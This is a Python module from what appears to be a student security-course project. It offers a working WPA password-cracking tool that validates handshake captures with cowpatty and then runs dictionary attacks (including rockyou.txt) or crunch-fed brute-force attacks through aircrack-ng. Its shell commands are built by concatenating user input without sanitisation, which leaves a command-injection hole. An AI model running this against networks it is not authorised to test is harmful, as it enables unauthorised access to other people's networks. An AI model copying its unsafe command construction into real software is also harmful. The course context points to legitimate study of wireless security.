'''
============================================================
                NSSECU2 - Hacking Tool Project
============================================================
        Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
        Topic: WiFi Hacking Tool
        Description: The objective of this project is to 
                     create a packaged tool that will be 
                     able to do Wi-Fi scanning, cracking, 
                     and admin control access.
        Objective Functionalities:
            1. WPA Scanning & Handshake Capture
            2. WPA Cracking
            3. WiFi DOS
            4. Other Tools
            5. Windows Saved WiFi Passwords
============================================================

WPA CRACKING MODULE
'''

import os
import subprocess
import utils.utils as utils

#Delegates WPA cracking
def crack(filename:str, wifi:dict):
    #Ensure filename has extensions
    if ".cap" not in filename: 
        filename += ".cap"

    #Check if file specified by filename exists
    if not os.path.isfile(filename):
        utils.header("WPA Cracking", "Specified file not found.")
        utils.getch()
        return None

    #Use cowpatty to validate if file contains WPA handshake
    utils.header("WPA Cracking", ["Filename: " + filename, "Checking file for WPA handshakes..."])
    cowpatty_process = subprocess.Popen("cowpatty -c -r " + filename + " -v | grep all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    cowpatty_process.wait()
    res, err = cowpatty_process.communicate()

    #Exit if not crackable
    if not crackable(res):
        return None
    
    #Determine if user wants to use Bruteforce
    password = ""
    if utils.yesNo("WPA Cracking","Dictionary or Bruteforce Mode","Bruteforce Mode?",False):
        password = brute_attack(filename, wifi)
    else:
        password = dict_attack(filename)
        
    return password

#Crack in bruteforce mode
def brute_attack(filename: str, wifi:dict):
    password = ""
    
    #Notify user about experimental state of bruteforce
    if not utils.yesNo("WPA Cracking (Bruteforce Attack)", ["This feature is highly experimental."], "Continue?", True):
        return ""

    #Bruteforce type selection
    int_brute = ["1","2","0"]
    str_brute = ["Custom Characters", "Predefined Characters", "Cancel"]
    while True:
        utils.header("WPA Cracking (Bruteforce Attack)", "Custom Charset")
        brute_choice = utils.menu(int_brute, str_brute)
        if utils.valid_choice(brute_choice, int_brute):
            break

    #Charset selector
    charset = ""
    select_char = True
    while select_char:
        if brute_choice == "1":
            utils.header("WPA Cracking (Bruteforce Attack)", "Custom Charset")
            charset = input("Enter your custom charset here: ")
            select_char = False
        elif brute_choice == "2":
            int_preset = ["1", "2", "3", "4", "5", "0"]
            str_preset = ["lowercase letters", "UPPERCASE letters", "Numbers", "Symbols", "*Undo","*Finished"]
            preset_switch = [False, False, False, False]
            last_selected = "" 
            while True:
                utils.header("WPA Cracking (Bruteforce Attack)", ["Charset Preset Selector: ",charset])
                preset_choice = utils.menu(int_preset, str_preset)
                if utils.valid_choice(preset_choice, int_preset):
                    if preset_choice == "0":
                        break
                    elif preset_choice == "1":
                        last_selected = "1"
                        if preset_switch[0] is True:
                            utils.header("WPA Cracking (Bruteforce Attack)", ["Charset Preset Selector:", charset, "", "Charset is already included: lowercase letters"])
                            utils.getch()
                        else:
                            preset_switch[0] = not preset_switch[0]
                            charset += "abcdefghijklmnopqrstuvwxyz"

                    elif preset_choice == "2":
                        last_selected = "2"
                        if preset_switch[1] is True:
                            utils.header("WPA Cracking (Bruteforce Attack)", ["Charset Preset Selector:", charset, "", "Charset is already included: UPPERCASE letters"])
                            utils.getch()
                        else:
                            preset_switch[1] = not preset_switch[1]
                            charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

                    elif preset_choice == "3":
                        last_selected = "3"
                        if preset_switch[2] is True:
                            utils.header("WPA Cracking (Bruteforce Attack)", ["Charset Preset Selector:", charset, "", "Charset is already included: Numbers"])
                            utils.getch()
                        else:
                            preset_switch[2] = not preset_switch[2]
                            charset += "0123456789"

                    elif preset_choice == "4":
                        last_selected = "4"
                        if preset_switch[3] is True:
                            utils.header("WPA Cracking (Bruteforce Attack)", ["Charset Preset Selector:", charset, "", "Charset is already included: Symbols"])
                            utils.getch()
                        else:
                            preset_switch[3] = not preset_switch[3]
                            charset += "~`! @#$%^&*()_-+={[}]|\:;\"\'<,>.?/"

                    elif preset_choice == "5":
                        # # for checking if user attempts to spam 'Undo' option
                        # if last_selected == "5" and len(charset) > 0:
                        #     utils.header("WPA Cracking (Bruteforce Attack)", ["Charset Preset Selector:", charset, "", "Cannot undo changes more than once!"])
                        #     utils.getch()
                        # else:
                        #     last_selected = "5"

                        if len(charset) > 0:
                            match last_selected:
                                case "1":
                                    charset = charset.replace("abcdefghijklmnopqrstuvwxyz","")
                                    preset_switch[0] = False
                                case "2":
                                    charset = charset.replace("ABCDEFGHIJKLMNOPQRSTUVWXYZ","")
                                    preset_switch[1] = False
                                case "3":
                                    charset = charset.replace("0123456789","")
                                    preset_switch[2] = False
                                case "4":
                                    charset = charset.replace("~`! @#$%^&*()_-+={[}]|\:;\"\'<,>.?/","")
                                    preset_switch[3] = False
                            utils.header("WPA Cracking (Bruteforce Attack)", ["Charset Preset Selector:", charset, "", "Charset removed."])
                            utils.getch()
                        else:
                            utils.header("WPA Cracking (Bruteforce Attack)", ["", "No charset has been included yet!"])
                            utils.getch()

            select_char = False
        else: #0
            return ""

    #Ask for string sizes (min and max)
    #@TODO Update the input process where an input situation of start >= end is not allowed.
    start = 0
    end = 0
    start_valid = False
    end_valid = False
    while not start_valid:
        try:
            utils.cls()
            utils.header("WPA Cracking (Bruteforce Attack)","Configuration")
            start = int(input("Enter minimum number of characters: "))
            if start <= 0:
                start_valid = False
                if not utils.yesNo("WPA Cracking (Bruteforce Attack)", ["Invalid value for minimum number of characters."], "Retry?", True):
                    return ""
            else:
                start_valid = True
        except ValueError:
            utils.cls()
    while not end_valid:
        try:
            utils.cls()
            utils.header("WPA Cracking (Bruteforce Attack)","Configuration")
            end = int(input("Enter maximum number of characters: "))
            if end <= start or end <= 0:
                end_valid = False
                if not utils.yesNo("WPA Cracking (Bruteforce Attack)", ["Invalid value for maximum number of characters."], "Retry?", True):
                    return ""
            else:
                end_valid = True
        except ValueError:
            utils.cls()

    #Ask for ssid if not provided
    ssid = ""
    if wifi == None:
        utils.header("WPA Cracking (Bruteforce Attack)")
        ssid = input("Enter SSID found in file: ")
    else:
        ssid = wifi["essid"]

    #Compute iterations for display
    iterations = str(utils.find_iterations(charset,start,end))

    #Confirm bruteforce cracking
    utils.header("WPA Cracking",["Configuration:","Size: " + str(start) + "-" + str(end),"Charset: " + charset,"Iterations: " + iterations])
    utils.getch("Press Enter to begin bruteforce cracking...")

    #Bruteforce command/process
    brute_command = "crunch " + str(start) + " " + str(end) + " " + charset + " | aircrack-ng -e " + ssid + " -w - " + filename + " | grep FOUND"
    brute_process = subprocess.Popen(brute_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    utils.header("WPA Cracking",["Configuration:","Size: " +    str(start) + "-" + str(end),"Charset: " + charset, "Iterations: " + iterations])
    print("Bruteforce cracking in progress...")

    #Retrieve result 
    res, err = brute_process.communicate()
    raw = str(res.decode("utf-8")+"").split()
    password = str(raw[3])
    utils.getch()

    return password

#Dictionary Attack
def dict_attack(filename: str):    
    password = ""

    #Dictionary menu
    int_dictionary = ["1","2","3","0"]
    str_dictionary = ["words.txt", "rockyou.txt", "Custom dictionary","Cancel"]
    while True:
        utils.header("WPA Cracking (Dictionary Attack)", ["Filename: " + filename, "Crackable!"])
        dict_choice = utils.menu(int_dictionary, str_dictionary)
        if utils.valid_choice(dict_choice, int_dictionary):
            break

    #Dictionary filename delegator
    dictionary = ""
    if dict_choice == "1":
        dictionary = "dict/words.txt"
    elif dict_choice == "2":
        if not os.path.isfile("dict/rockyou.txt"):
            utils.header("WPA Cracking (Dictionary Attack)","Loading rockyou.txt dictionary...")
            subprocess.Popen("gzip -dkc dict/rockyou.txt.gz > dict/rockyou.txt", shell=True, stdout=subprocess.PIPE).wait()
        dictionary = "dict/rockyou.txt"
    elif dict_choice == "3":
        dictionary = input("Enter path & filename (.txt): ")
        if ".txt" not in dictionary:
            dictionary += ".txt"
    elif dict_choice == "0":
        return None
    
    #WPA Cracking process
    utils.header("WPA Cracking", "Loading processes...")
    aircrackng_command = "aircrack-ng -w " + dictionary + " " + filename + " | grep FOUND"
    aircrackng = subprocess.Popen(aircrackng_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    utils.header("WPA Cracking","Cracking in progress...")

    #Retrieve result
    res, err = aircrackng.communicate()
    raw = str(res.decode("utf-8")+"").split()
    password = str(raw[3])

    return password

#Checks if file is crackable (via cowpatty)
def crackable(res):
    return "all" in str(res.decode("utf-8"))